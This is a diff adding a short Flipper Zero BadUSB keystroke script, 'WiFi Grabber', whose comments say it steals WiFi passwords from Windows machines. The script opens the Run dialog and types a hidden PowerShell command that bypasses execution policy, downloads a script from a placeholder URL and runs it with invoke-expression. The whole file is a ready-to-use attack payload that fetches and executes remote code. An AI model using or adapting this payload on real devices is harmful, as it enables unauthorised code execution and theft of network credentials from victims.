@@ -1,0 +1,12 @@
+REM Title:          WiFi Grabber
+REM Author:         Rick (LordCodigo) Alvarez 
+REM Description:    
+REM                 EN: Script for grabbing WiFi netoworks for Windows Machines
+REM                 ES: Script ladron de contraseñas de redes WiFi para machinas Windows
+REM Target:         Device: Flipper Zero / Target platform: Windows
+
+GUI r
+DELAY 200
+STRING powershell -w h -NoP -NonI -Exec Bypass; $pl = iwr """<your_ps1_url_here>"""; invoke-expression $pl
+DELAY 200
+ENTER
